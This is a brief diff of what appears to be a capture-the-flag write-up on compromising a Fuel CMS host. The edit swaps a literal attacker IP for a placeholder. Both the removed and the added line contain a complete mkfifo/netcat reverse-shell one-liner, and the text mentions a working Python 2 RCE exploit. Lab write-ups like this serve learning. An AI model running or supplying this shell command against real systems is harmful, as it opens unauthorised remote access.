@@ -13,7 +13,7 @@ Checking the webpage, it is obvious that it is a fuel cms website
 
 rce exploit for python2 was available and worked
 
-created a reverse shell by `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.5.34 9999 >/tmp/f`
+created a reverse shell by `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <<IP>> 9999 >/tmp/f`
 
 found the user flag at the home directory
 
